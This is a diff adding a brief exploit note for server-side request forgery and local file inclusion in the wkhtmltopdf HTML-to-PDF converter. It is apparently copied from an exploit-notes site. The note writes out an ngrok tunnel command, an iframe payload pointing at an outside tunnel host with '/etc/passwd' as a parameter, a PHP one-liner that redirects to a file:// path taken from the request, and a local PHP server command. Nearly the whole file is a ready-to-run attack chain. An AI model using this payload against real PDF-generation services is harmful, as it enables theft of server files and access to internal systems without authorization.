@@ -1,0 +1,20 @@
+
+Exploit SSRF & LFI in wkhtmltopdf
+https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/
+
+# Build tunnel
+ngrok tcp 127.0.0.1:8000
+
+#Creating HTML File e.g. index.html:
+<iframe src="http://0.tcp.eu.ngrok.io:13264/index.php?x=/etc/passwd" width=1000px height=1000px></iframe>
+
+# Creating PHP File e.g. index.php:
+<?php header('location:file://'.$_REQUEST['x']); ?>
+
+#PHP Web Server:
+php -S 127.0.0.1:8000
+
+###Exploit SSRF via the following payload:
+http://ngrok-link:port/index.html
+e.g. http://0.tcp.eu.ngrok.io:13264/index.html
+
